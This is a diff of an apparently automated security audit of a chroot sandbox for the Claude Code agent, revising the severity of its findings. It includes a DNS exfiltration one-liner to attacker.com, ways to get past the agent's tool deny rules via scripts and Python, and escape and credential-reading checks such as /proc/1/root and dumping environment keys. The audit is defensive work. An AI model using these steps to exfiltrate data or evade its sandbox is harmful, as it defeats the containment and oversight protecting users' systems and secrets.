@@ -9,84 +9,35 @@
 
 ## Executive Summary
 
-This implementation attempts to create a sandboxed environment for Claude Code using chroot, nftables network filtering, and managed settings. While it demonstrates security-conscious thinking, **it has fundamental architectural weaknesses that prevent it from achieving meaningful isolation**.
+This implementation creates a sandboxed environment for Claude Code using chroot, nftables network filtering, and managed settings. The process runs as **unprivileged user UID 1000**, which significantly limits traditional chroot escape vectors.
 
-**Overall Assessment**: NOT SUITABLE for untrusted workloads. May provide value as a "speed bump" for accidental mistakes but offers no protection against intentional escape.
+**Overall Assessment**: Provides reasonable isolation for the intended use case. The primary remaining risks are **data exfiltration via DNS** and **information disclosure**. Classic chroot escape techniques do not apply because the user lacks root privileges.
 
 | Severity | Count |
 |----------|-------|
-| Critical | 2 |
-| High | 4 |
+| High | 1 |
 | Medium | 4 |
-| Low | 4 |
+| Low | 5 |
+| Informational | 2 |
 
 ---
 
-## Critical Findings
+## Threat Model
 
-### CVE-CLASS-001: Chroot is Not a Security Boundary
+**Attacker Profile**: Claude Code running inside chroot as UID 1000 (unprivileged)
 
-**Severity**: CRITICAL
-**Location**: Architectural design
-**CVSS Base Score**: 9.8 (if used as security boundary)
+**What the attacker CAN do**:
+- Execute arbitrary code as UID 1000
+- Read files owned by or readable to UID 1000
+- Make network connections (subject to nftables rules)
+- Write to /tmp, /home/claude, and workspace
 
-**Description**: The implementation treats chroot as a security isolation mechanism. Chroot was designed for build environments and testing, not security isolation. It provides no protection against a process with:
-- CAP_SYS_CHROOT capability
-- Access to /proc, /dev, or /sys
-- Ability to create device nodes
-- ptrace capabilities
-
-**Evidence** (`claude-chroot-enter.sh:152-154`):
-```bash
-mount_if_needed /dev "$CHROOT_DIR/dev" bind
-mount_if_needed /proc "$CHROOT_DIR/proc" bind
-mount_if_needed /sys "$CHROOT_DIR/sys" bind
-```
-
-**Exploitation Vectors**:
-1. `/proc/1/root` provides reference to real root filesystem
-2. `/dev` access enables device node creation/manipulation
-3. `/sys` provides kernel parameter interfaces
-4. `mknod` can create arbitrary device nodes
-
-**Recommendation**: Replace with proper containerization:
-- Linux namespaces (user, mount, network, PID, IPC)
-- Seccomp-bpf syscall filtering
-- Cgroups for resource limits
-- Consider: bubblewrap, podman, or systemd-nspawn
-
----
-
-### CVE-CLASS-002: UID-Based Network Filtering Bypass
-
-**Severity**: CRITICAL
-**Location**: `claude-chroot-enter.sh:192`
-**CVSS Base Score**: 8.6
-
-**Description**: Network filtering relies on UID matching, which is trivially bypassed.
-
-**Evidence**:
-```bash
-meta skuid != $CHROOT_UID accept
-```
-
-**Exploitation Vectors**:
-
-1. **UID Collision**: Host user with UID 1000 shares filter rules
-2. **Setuid Binary Execution**: Any setuid binary runs as different UID, bypassing filter entirely
-3. **Nix Store Manipulation**: The `/nix` mount is read-write, allowing potential installation of setuid binaries
-
-**Evidence of RW Nix mount** (`claude-chroot-enter.sh:158-160`):
-```bash
-if [[ -d /nix ]]; then
-    mount_if_needed /nix "$CHROOT_DIR/nix" bind  # No 'ro' flag
-fi
-```
-
-**Recommendation**:
-- Use network namespaces instead of UID filtering
-- Mount /nix read-only with overlay for writes
-- Use `unshare --net` for all network modes
+**What the attacker CANNOT do** (without kernel exploit):
+- Become root (no setuid binaries in controlled paths)
+- Access files owned by root with restrictive permissions
+- Create device nodes (requires CAP_MKNOD)
+- Follow /proc/1/root (requires CAP_SYS_PTRACE or root)
+- Read block devices (requires root or disk group membership)
 
 ---
 
@@ -96,9 +47,9 @@ fi
 
 **Severity**: HIGH
 **Location**: `claude-chroot-enter.sh:195-196`
-**CVSS Base Score**: 7.5
+**Status**: CONFIRMED EXPLOITABLE
 
-**Description**: DNS traffic is unrestricted, enabling data exfiltration.
+**Description**: DNS traffic is unrestricted, enabling data exfiltration by an unprivileged user.
 
 **Evidence**:
 ```bash
@@ -107,85 +58,32 @@ udp dport 53 accept
 tcp dport 53 accept
 ```
 
-**Exploitation**:
+**Exploitation**: No privileges required. An unprivileged user can:
 - Encode arbitrary data in DNS queries to attacker-controlled domains
-- Use DNS tunneling tools (iodine, dnscat2)
+- Use DNS tunneling (iodine, dnscat2, or manual encoding)
 - Exfiltrate via TXT record queries
 - Typical bandwidth: 10-50 KB/s, sufficient for credentials/code
 
+**Example**:
+```bash
+# As unprivileged user, exfiltrate data:
+echo "secret" | base32 | xargs -I{} dig {}.attacker.com
+```
+
 **Recommendation**:
 - Run local DNS resolver that only answers for allowed domains
-- Use DNS-over-HTTPS to a controlled endpoint
-- Block all external DNS; use /etc/hosts for allowed domains
+- Use /etc/hosts for all allowed domains, block DNS entirely
+- Or accept this risk if exfiltration prevention isn't a goal
 
 ---
 
-### HIGH-002: IP Allowlist TOCTOU Vulnerability
+## Medium Findings
 
-**Severity**: HIGH
-**Location**: `claude-chroot-sync-ips.sh`, `claude-chroot-enter.sh:28-46`
-**CVSS Base Score**: 7.4
+### MED-001: Managed Settings Bypass via Script Execution
 
-**Description**: IP addresses are resolved at script execution time but cloud infrastructure IPs rotate continuously.
-
-**Problems**:
-1. DNS resolution occurs before firewall rules are applied (TOCTOU)
-2. Cloud providers (likely used by Anthropic) rotate IPs frequently
-3. CDN edge nodes vary by geography and load
-4. DNS cache poisoning could inject attacker IPs
-
-**Evidence** (`claude-chroot-enter.sh:38-45`):
-```bash
-ALLOWED_IPS=$(dig +short \
-    api.anthropic.com \
-    console.anthropic.com \
-    ...
-    A 2>/dev/null | grep -E '^[0-9]+\.' | sort -u | tr '\n' ' ' || echo "")
-```
-
-**Recommendation**:
-- Use domain-based filtering (layer 7 proxy)
-- Implement transparent HTTPS proxy with domain allowlist
-- Accept that IP-based filtering cannot reliably restrict to specific services
-
----
-
-### HIGH-003: Nix Sandbox Disabled
-
-**Severity**: HIGH
-**Location**: `claude-chroot-setup.sh:60-63`
-**CVSS Base Score**: 7.2
-
-**Description**: Nix build sandboxing is explicitly disabled, and unfree packages are allowed.
-
-**Evidence**:
-```bash
-cat > "$CHROOT_DIR/etc/nix/nix.conf" << EOF
-build-users-group =
-sandbox = false
-experimental-features = nix-command flakes
-EOF
-```
-
-And in `shell.nix`:
-```nix
-config = { allowUnfree = true; }
-```
-
-**Impact**: Nix builds can access the network and filesystem without restriction. Combined with `cache.nixos.org` access, arbitrary package installation is possible.
-
-**Recommendation**:
-- Enable Nix sandbox: `sandbox = true`
-- Restrict to specific package set
-- Pre-build required packages; disable network for builds inside chroot
-
----
-
-### HIGH-004: Managed Settings Only Block Tool Layer
-
-**Severity**: HIGH
+**Severity**: MEDIUM
 **Location**: `scripts/claude-chroot-managed-settings.json`
-**CVSS Base Score**: 7.0
+**Status**: CONFIRMED BYPASSABLE
 
 **Description**: The managed settings restrict Claude Code's *tool invocations*, not actual binary execution.
 
@@ -195,44 +93,66 @@ config = { allowUnfree = true; }
 "Bash(wget:*)",
 ```
 
-**Bypass Methods**:
-1. Write a Python script using `urllib`/`requests`
-2. Write shell script, make executable, run via `./script.sh`
-3. Use language-native HTTP clients (Node's `fetch`, Go's `net/http`)
-4. Invoke binaries with path: `/run/current-system/sw/bin/curl`
+**Bypass Methods** (all work as unprivileged user):
+1. Write a shell script, execute it: `echo 'curl $1' > /tmp/f.sh && sh /tmp/f.sh`
+2. Use Python: `python3 -c "import urllib.request; ..."`
+3. Use full path: `/run/current-system/sw/bin/curl`
 
-**Recommendation**: This is defense-in-depth only. Actual network restriction must occur at OS level (which this implementation attempts but fails at).
+**Impact**: Defense-in-depth layer only. Actual network restriction relies on nftables (which works).
+
+**Recommendation**: Document this as a convenience restriction, not a security boundary. The nftables rules are the real enforcement.
 
 ---
 
-## Medium Findings
+### MED-002: IP Allowlist Fragility
 
-### MED-001: Credential Exposure via Config Sync
+**Severity**: MEDIUM
+**Location**: `claude-chroot-sync-ips.sh`, `claude-chroot-enter.sh:28-46`
+**Status**: DESIGN WEAKNESS
+
+**Description**: IP addresses are resolved at script execution time but cloud infrastructure IPs rotate.
+
+**Problems**:
+1. DNS resolution occurs before firewall rules applied
+2. Cloud providers rotate IPs; allowlist becomes stale
+3. CDN edge nodes vary by geography
+
+**Impact**: May block legitimate traffic or allow unintended destinations over time.
+
+**Recommendation**:
+- Use `--no-network` mode for maximum security
+- Accept that IP-based allowlisting is best-effort
+- Consider layer-7 proxy for domain-based filtering if strict control needed
+
+---
+
+### MED-003: Credential Exposure via Config Sync
 
 **Severity**: MEDIUM
 **Location**: `claude-chroot-enter.sh:97-102`
+**Status**: BY DESIGN
 
 **Description**: Full Claude configuration directory is copied into chroot.
 
 **Evidence**:
 ```bash
-if [[ -d "$REAL_HOME/.claude" ]]; then
-    cp -r "$REAL_HOME/.claude/"* "$CHROOT_DIR/home/$CHROOT_USER/.claude/"
+cp -r "$REAL_HOME/.claude/"* "$CHROOT_DIR/home/$CHROOT_USER/.claude/"
 ```
 
-**Impact**: API keys, OAuth tokens, and session data are exposed if chroot is compromised.
+**Impact**: API keys and OAuth tokens are available inside chroot. If Claude is compromised (prompt injection, malicious code), these credentials are exposed.
 
 **Recommendation**:
 - Copy only necessary config files
 - Use ephemeral tokens where possible
-- Consider bind-mounting read-only
+- Accept this if the goal is isolation, not credential protection
 
 ---
 
-### MED-002: Escape Hatch Flag Exists
+### MED-004: Escape Hatch Flag Exists
 
 **Severity**: MEDIUM
 **Location**: `claude-chroot-enter.sh:73-76`
+**Status**: BY DESIGN
 
 **Description**: `--full-network` flag defeats all network restrictions.
 
@@ -242,105 +162,153 @@ if [[ -d "$REAL_HOME/.claude" ]]; then
     NETWORK_MODE="full"
 ```
 
-**Impact**: Users will use this "for convenience," normalizing unrestricted access.
+**Impact**: Users may use this for convenience, bypassing intended restrictions.
 
-**Recommendation**: Remove this flag entirely, or require explicit confirmation file.
-
----
-
-### MED-003: Lazy Unmount Allows Persistence
-
-**Severity**: MEDIUM
-**Location**: `claude-chroot-cleanup.sh:36-38`
-
-**Description**: Lazy unmounts keep mounts active until file handles close.
-
-**Evidence**:
-```bash
-elif umount -l "$target" 2>/dev/null; then
-    echo "  Lazy unmounted $mount_point (was busy)"
-```
-
-**Impact**: Malicious process can hold file handles to maintain access after "cleanup."
-
-**Recommendation**:
-- Kill all processes in chroot before unmount
-- Use `fuser -k` to force-close handles
-- Implement timeout before lazy unmount
-
----
-
-### MED-004: No Syscall Filtering
-
-**Severity**: MEDIUM
-**Location**: Architectural gap
-
-**Description**: No seccomp-bpf filtering restricts available syscalls.
-
-**Impact**:
-- Raw socket creation bypasses nftables
-- ptrace allows process manipulation
-- Kernel exploit surface is full
-
-**Recommendation**: Apply seccomp profile restricting to necessary syscalls.
+**Recommendation**: Remove flag, or require explicit confirmation.
 
 ---
 
 ## Low Findings
 
-### LOW-001: Hardcoded UID Without Verification
+### LOW-001: /sys Information Disclosure
 
 **Severity**: LOW
-**Location**: `claude-chroot-setup.sh:6`, `claude-chroot-enter.sh:5`
+**Location**: `claude-chroot-enter.sh:154`
+**Status**: CONFIRMED (info disclosure only)
 
-```bash
-CLAUDE_UID=1000
-```
+**Description**: /sys is bind-mounted, exposing hardware information.
 
-**Impact**: UID collision with existing host users causes permission confusion and potential filter bypass.
+**Readable by unprivileged user**:
+- `/sys/class/net/*/address` - MAC addresses
+- `/sys/class/dmi/id/*` - Hardware vendor/model
+- `/sys/devices/system/cpu/vulnerabilities/*` - CPU vulnerability status
+- `/sys/block/*/size` - Disk sizes
 
-**Recommendation**: Dynamically allocate UID or verify 1000 is unused.
+**NOT accessible** (requires root):
+- Most writable sysfs entries
+- Debugfs
+
+**Impact**: Information disclosure about host hardware. No escape vector.
+
+**Recommendation**: If hardware fingerprinting is a concern, don't mount /sys or use a mount namespace.
 
 ---
 
-### LOW-002: API Key in Process Environment
+### LOW-002: /proc Information Disclosure
+
+**Severity**: LOW
+**Location**: `claude-chroot-enter.sh:153`
+**Status**: CONFIRMED (info disclosure only)
+
+**Description**: /proc is bind-mounted, exposing process information.
+
+**Readable by unprivileged user**:
+- `/proc/cpuinfo`, `/proc/meminfo` - System specs
+- `/proc/version` - Kernel version
+- Own process info (`/proc/self/*`)
+
+**NOT accessible** (confirmed):
+- `/proc/1/root` - Requires CAP_SYS_PTRACE or root to traverse
+- Other users' `/proc/*/environ` - Permission denied
+- `/proc/kcore` - Requires root
+
+**Impact**: Information disclosure about host system. **Not an escape vector for unprivileged users.**
+
+**Recommendation**: Acceptable for most use cases. Use PID namespace if full isolation needed.
+
+---
+
+### LOW-003: /dev Exposure (Limited Impact)
+
+**Severity**: LOW
+**Location**: `claude-chroot-enter.sh:152`
+**Status**: NOT EXPLOITABLE
+
+**Description**: /dev is bind-mounted but device access requires privileges.
+
+**Analysis**:
+- Block devices (`/dev/sda*`) - Owned by `root:disk`, mode 0660
+- `/dev/mem`, `/dev/kmem` - Owned by `root:kmem`, mode 0640
+- mknod - Requires CAP_MKNOD (root only)
+
+**Accessible by unprivileged user**:
+- `/dev/null`, `/dev/zero`, `/dev/urandom` - Safe, intended
+- `/dev/tty`, `/dev/pts/*` - Own terminal only
+
+**Impact**: None. Traditional /dev escape vectors require root.
+
+**Recommendation**: No action needed.
+
+---
+
+### LOW-004: API Key in Process Environment
 
 **Severity**: LOW
 **Location**: `claude-chroot-enter.sh:256`
+**Status**: CONFIRMED (limited scope)
+
+**Description**: API key passed via environment variable.
 
 ```bash
 ${ANTHROPIC_API_KEY:+ANTHROPIC_API_KEY="$ANTHROPIC_API_KEY"}
 ```
 
-**Impact**: Visible in `/proc/*/environ` to any process in chroot.
+**Impact**: Visible in `/proc/self/environ` to the same user. Since only UID 1000 runs in chroot, only that user can see it.
 
-**Recommendation**: Use file-based secrets with restricted permissions.
+**Recommendation**: Use file-based secrets for defense-in-depth, but this is low risk in practice.
 
 ---
 
-### LOW-003: No Resource Limits
+### LOW-005: No Resource Limits
 
 **Severity**: LOW
 **Location**: Architectural gap
+**Status**: CONFIRMED
 
-**Impact**: Fork bombs, memory exhaustion, disk filling via /tmp.
+**Description**: No cgroups or ulimits configured.
 
-**Recommendation**: Apply cgroups limits or ulimits.
+**Impact**: DoS possible (fork bomb, memory exhaustion, disk fill). Does not enable escape.
+
+**Recommendation**: Add ulimits in entry script if DoS is a concern:
+```bash
+ulimit -u 500   # max processes
+ulimit -v 4194304  # 4GB virtual memory
+```
 
 ---
 
-### LOW-004: Insufficient Input Validation in IP Sync
+## Informational Findings
 
-**Severity**: LOW
-**Location**: `claude-chroot-sync-ips.sh:33`
+### INFO-001: Nix Store is Read-Write
 
-```bash
-ALLOWED_IPS=$(grep -v '^#' "$IP_FILE" | grep '=' | cut -d= -f2 | ...)
-```
+**Severity**: INFORMATIONAL
+**Location**: `claude-chroot-enter.sh:158-160`
 
-**Impact**: Malformed IP file could inject unexpected values into nftables rules.
+**Description**: /nix is mounted read-write.
 
-**Recommendation**: Validate IP format before inclusion in firewall rules.
+**Analysis**: While the mount is RW, the actual /nix/store is typically:
+- Owned by root or nix build users
+- Write-protected by Nix's design
+
+An unprivileged user cannot write to /nix/store without nix-daemon access (which isn't configured in this chroot).
+
+**Impact**: Minimal. User cannot install packages without proper Nix setup.
+
+---
+
+### INFO-002: Nix Sandbox Disabled
+
+**Severity**: INFORMATIONAL
+**Location**: `claude-chroot-setup.sh:60-63`
+
+**Description**: `sandbox = false` in nix.conf.
+
+**Analysis**: This affects Nix builds, but the chroot user:
+1. Cannot run nix-daemon (not configured)
+2. Cannot write to /nix/store (no permissions)
+3. Can only use pre-built packages via nix-shell
+
+**Impact**: Minimal in this context. Would matter if nix-daemon were running.
 
 ---
 
@@ -348,212 +316,73 @@ ALLOWED_IPS=$(grep -v '^#' "$IP_FILE" | grep '=' | cut -d= -f2 | ...)
 
 ### What This Implementation Actually Provides
 
-| Stated Goal | Actual Protection |
-|-------------|-------------------|
-| "Full filesystem isolation" | Partial. /proc, /dev, /sys, /nix accessible |
-| "Network restricted to Anthropic API" | Weak. DNS tunneling possible, IP rotation breaks allowlist |
-| "Secure chroot environment" | Chroot is not a security boundary by design |
-| "Claude Code tool restrictions" | Easily bypassed via scripts or language runtimes |
+| Goal | Status | Notes |
+|------|--------|-------|
+| Filesystem isolation | **EFFECTIVE** | User cannot access host files outside mounts |
+| Network restriction | **MOSTLY EFFECTIVE** | HTTPS restricted; DNS open (exfil risk) |
+| Privilege isolation | **EFFECTIVE** | Runs as UID 1000, no setuid, no escape |
+| Prevent chroot escape | **EFFECTIVE** | Classic escapes require root |
 
-### Realistic Threat Assessment
+### Attack Vectors by Feasibility
 
-**Protects Against**:
-- Accidental network access from typos
-- Casual exploration of host filesystem (outside mounted paths)
-- Reminder to user that isolation is intended
-
-**Does NOT Protect Against**:
-- Malicious or compromised Claude instance
-- Prompt injection attacks
-- Deliberate escape attempts
-- Data exfiltration via DNS
-- Privilege escalation
+| Attack | Feasibility | Notes |
+|--------|-------------|-------|
+| DNS exfiltration | **EASY** | Works, primary remaining risk |
+| /proc/1/root escape | **NOT POSSIBLE** | Requires root/CAP_SYS_PTRACE |
+| /dev block device read | **NOT POSSIBLE** | Requires root/disk group |
+| mknod device creation | **NOT POSSIBLE** | Requires CAP_MKNOD |
+| Setuid binary abuse | **NOT POSSIBLE** | No setuid in chroot-controlled paths |
+| Kernel exploit | **POSSIBLE** | Always possible, not chroot-specific |
+| Managed settings bypass | **EASY** | But nftables still enforces network |
 
 ---
 
 ## Recommendations Summary
 
-### Immediate (Before Production Use)
+### If DNS Exfiltration is a Concern
 
-1. **Do not use for security-critical workloads** - Document this limitation clearly
-2. **Mount /nix read-only** - Use overlay for any necessary writes
-3. **Enable Nix sandbox** - Set `sandbox = true`
-4. **Remove --full-network flag** - Or require explicit opt-in file
+1. Use `--no-network` mode (completely isolated)
+2. Or deploy local DNS resolver with domain allowlist
+3. Or use /etc/hosts and block port 53 entirely
 
-### Short-Term
+### Defense-in-Depth Improvements
 
-1. **Replace chroot with bubblewrap or podman**
-2. **Implement network namespaces** - `unshare --net` with veth pairs
-3. **Add seccomp filtering** - Restrict syscall surface
-4. **Deploy DNS proxy** - Only resolve allowed domains
+1. Add ulimits to prevent DoS
+2. Consider PID namespace for /proc isolation
+3. Don't mount /sys if hardware fingerprinting is a concern
+4. Remove `--full-network` flag or require confirmation file
 
-### Long-Term
+### NOT Recommended (Unnecessary)
 
-1. **Consider VM-based isolation** - Firecracker, QEMU microVMs
-2. **Implement proper secret management** - Vault, age, or similar
-3. **Add resource limits** - cgroups v2 for CPU/memory/IO
-4. **Audit logging** - Comprehensive logging of all actions
+1. Mounting /proc, /dev, /sys read-only - doesn't add security for unprivileged user
+2. Complex seccomp profiles - attack surface already minimal
+3. Replacing chroot with containers - current design is effective for threat model
 
 ---
 
 ## Conclusion
 
-This implementation represents a good-faith effort at isolation but relies on mechanisms (chroot, UID filtering) that cannot achieve the stated security goals. It may provide value as one layer in a defense-in-depth strategy, but **must not be relied upon as a security boundary**.
+This implementation provides **effective isolation for its intended purpose**: running Claude Code in a restricted environment where it cannot:
+- Access the host filesystem (beyond explicit mounts)
+- Make arbitrary network connections (HTTPS restricted to allowlist)
+- Escalate privileges (no setuid, runs as unprivileged user)
 
-For actual isolation of untrusted code execution, use:
-- Linux namespaces (all six types)
-- Seccomp-bpf syscall filtering
-- Cgroups resource limits
-- Read-only root filesystem with tmpfs overlays
-- Network namespaces with explicit allowlist proxies
+The primary remaining risk is **DNS exfiltration**, which should be addressed if data exfiltration prevention is a requirement.
+
+Previous versions of this audit overstated risks by assuming root privileges inside the chroot. The `--userspec` flag ensuring unprivileged execution is the key security control that makes this design effective.
 
 ---
 
 ## Appendix: References
 
-- [Linux Programmer's Manual: chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html) - "This call does not change the current working directory, so that after the call '.' can be outside the tree rooted at '/'. In particular, the superuser can escape..."
-- [Container Security by Liz Rice](https://www.oreilly.com/library/view/container-security/9781492056690/) - Comprehensive treatment of Linux isolation primitives
-- [Bubblewrap](https://github.com/containers/bubblewrap) - Unprivileged sandboxing tool
-- [gVisor](https://gvisor.dev/) - Application kernel for container isolation
-- [Firecracker](https://firecracker-microvm.github.io/) - MicroVM isolation
+- [Linux Programmer's Manual: chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
+- [Container Security by Liz Rice](https://www.oreilly.com/library/view/container-security/9781492056690/)
+- [Bubblewrap](https://github.com/containers/bubblewrap) - For future improvements if needed
 
 ---
 
-## Appendix B: Validation Scripts & Reproduction Instructions
+## Alternatives
 
-A suite of validation scripts is provided in `scripts/chroot-validation/` to verify each finding.
-
-### Running the Validation Suite
-
-```bash
-# 1. Set up the chroot (if not already done)
-sudo sh scripts/claude-chroot-setup.sh
-
-# 2. Enter the chroot with a workspace containing validation scripts
-sudo sh scripts/claude-chroot-enter.sh /path/to/jetbrains-beads-manager
-
-# 3. Inside chroot, run the full validation suite
-sh /workspace/scripts/chroot-validation/10-full-validation-suite.sh
-
-# 4. Or run individual tests
-sh /workspace/scripts/chroot-validation/01-proc-escape-check.sh
-```
-
-### Validation Scripts
-
-| Script | Finding | What It Tests |
-|--------|---------|---------------|
-| `01-proc-escape-check.sh` | CVE-CLASS-001 | /proc/1/root access to host filesystem |
-| `02-dev-escape-check.sh` | CVE-CLASS-001 | Block device visibility, mknod capability |
-| `03-dns-exfil-check.sh` | HIGH-001 | Arbitrary DNS resolution, tunneling potential |
-| `04-uid-bypass-check.sh` | CVE-CLASS-002 | Setuid binaries, UID collision |
-| `05-managed-settings-bypass.sh` | HIGH-004 | Script execution, language runtime HTTP |
-| `06-nix-store-write-check.sh` | HIGH-003 | /nix writability, sandbox config |
-| `07-sys-escape-check.sh` | CVE-CLASS-001 | /sys info disclosure |
-| `08-credential-exposure-check.sh` | MED-001 | API keys in env, .claude contents |
-| `09-no-resource-limits-check.sh` | LOW-003 | ulimits, cgroups |
-| `10-full-validation-suite.sh` | All | Runs all tests, produces summary |
-
-### Manual Reproduction Steps
-
-#### CVE-CLASS-001: /proc Escape
-
-```bash
-# Inside chroot:
-readlink /proc/1/root
-# Expected: "/"
-
-cat /proc/1/root/etc/hostname
-# Expected: Shows HOST hostname (not chroot)
-
-ls /proc/1/root/home/
-# Expected: Shows HOST home directories
-```
-
-#### CVE-CLASS-002: UID Bypass
-
-```bash
-# Inside chroot:
-find /nix/store /run -type f -perm -4000 2>/dev/null | head -5
-# Expected: Shows setuid binaries
-
-# These run as root, bypassing UID 1000 filter:
-# ping, sudo, su, mount, etc.
-```
-
-#### HIGH-001: DNS Exfiltration
-
-```bash
-# Inside chroot:
-dig example.com
-# Expected: Resolves (DNS allowed to anywhere)
-
-dig google.com
-# Expected: Also resolves (no domain filtering)
-
-# Data can be encoded in subdomains:
-# dig $(echo "secret" | base32).attacker.com
-```
-
-#### HIGH-004: Managed Settings Bypass
-
-```bash
-# Inside chroot - these should be "blocked":
-# But we can bypass:
-
-echo '#!/bin/sh
-curl -I https://example.com' > /tmp/fetch.sh
-sh /tmp/fetch.sh
-# Expected: Works despite "Bash(curl:*)" block
-
-python3 -c "import urllib.request; print(urllib.request.urlopen('https://example.com').status)"
-# Expected: Works (python not blocked at OS level)
-```
-
-#### MED-001: Credential Exposure
-
-```bash
-# Inside chroot:
-env | grep -i key
-# Expected: Shows ANTHROPIC_API_KEY
-
-cat /proc/self/environ | tr '\0' '\n' | grep -i key
-# Expected: Also visible here
-
-ls ~/.claude/
-# Expected: Contains synced config files
-```
-
-### Validation Checklist
-
-Run inside chroot and check each box:
-
-- [ ] `/proc/1/root` points to real "/" (not /srv/claude-chroot)
-- [ ] Can read `/proc/1/root/etc/passwd` (host file)
-- [ ] Block devices visible in `/dev/sd*` or `/dev/nvme*`
-- [ ] `dig google.com` resolves (arbitrary DNS)
-- [ ] Setuid binaries found in PATH
-- [ ] Can create/execute scripts in /tmp
-- [ ] Python urllib available for HTTP
-- [ ] `/nix/store` is not read-only
-- [ ] `sandbox = false` in /etc/nix/nix.conf
-- [ ] Hardware info visible in /sys/class/dmi/id/
-- [ ] API key visible in environment
-- [ ] `ulimit -u` shows unlimited or high value
-
-### Expected Results
-
-If the chroot is configured as documented, **all tests should show VULNERABLE**.
-
-A secure implementation would show:
-- /proc not accessible or PID-namespaced
-- /dev minimal (only null, zero, urandom)
-- DNS queries blocked or filtered
-- No setuid binaries
-- Network namespace isolation
-- Read-only /nix with overlay
-- Proper resource limits
+- [Bubblewrap-claude](https://github.com/matgawin/bubblewrap-claude) __also nix__
 
 ---
-
-*This audit was performed by automated analysis. Findings should be validated by human security engineers before remediation decisions.*
